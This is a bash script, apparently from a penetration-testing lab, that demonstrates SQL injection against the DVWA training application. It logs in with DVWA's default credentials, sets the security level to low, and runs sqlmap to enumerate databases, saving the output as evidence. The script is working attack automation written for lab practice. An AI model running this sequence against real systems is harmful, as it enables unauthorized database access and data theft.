#!/usr/bin/env bash
# Demo rápida Fase 5 SQLi — solo DVWA (7 DBs en ~30s, sin Mutillidae que tarda 7+ min)
set -uo pipefail
source /root/scripts/lib/common.sh

validate_target "${LAB_TARGET}"
EVIDENCE_DIR=$(init_evidence_dir "phase-5-exploitation")
banner "Phase 5 — SQL Injection DVWA (demo)"

log INFO "Autenticando contra DVWA"
curl -s -c /tmp/dvwa-demo-cook.txt \
    -d "username=admin&password=password&Login=Login" \
    "http://${LAB_TARGET}/dvwa/login.php" > /dev/null
curl -s -b /tmp/dvwa-demo-cook.txt \
    "http://${LAB_TARGET}/dvwa/security.php" > /dev/null
PHPSESSID=$(awk '/PHPSESSID/{print $7}' /tmp/dvwa-demo-cook.txt)
COOKIE="security=low; PHPSESSID=${PHPSESSID}"
log INFO "Sesion obtenida: ${COOKIE}"

log INFO "Ejecutando sqlmap en DVWA — extrayendo bases de datos"
sqlmap \
    -u "http://${LAB_TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="${COOKIE}" \
    --dbs \
    --batch \
    --level=1 --risk=1 \
    --timeout=10 \
    --output-dir="${EVIDENCE_DIR}/sqlmap-dvwa" \
    2>&1 | tee "${EVIDENCE_DIR}/sqli-dvwa.log"

log INFO "Evidence saved at: ${EVIDENCE_DIR}"
log INFO "Files generated:"
ls -la "${EVIDENCE_DIR}"
